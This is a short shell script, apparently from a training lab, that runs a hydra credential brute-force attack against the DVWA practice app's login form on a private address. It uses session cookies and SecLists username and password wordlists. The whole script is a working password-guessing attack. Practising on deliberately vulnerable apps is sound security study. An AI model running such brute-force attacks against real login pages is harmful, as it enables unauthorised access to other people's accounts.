#Connect to the actual page for brute force
# curl -s -i -L 192.168.178.98/dvwa/vulnerabilities/brute/  > vuln
#
source ../levelled_login.sh low
#Check out the "bruteforce" page
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/brute/ > /dev/null
#Send our known login
rm hydra.restore
hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 1 -Vv -u -F -w 10 -W 1 -V 192.168.178.98 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: security=${SECURITY}; PHPSESSID=${SESSIONID}"
unset LEVEL
unset SESSIONID
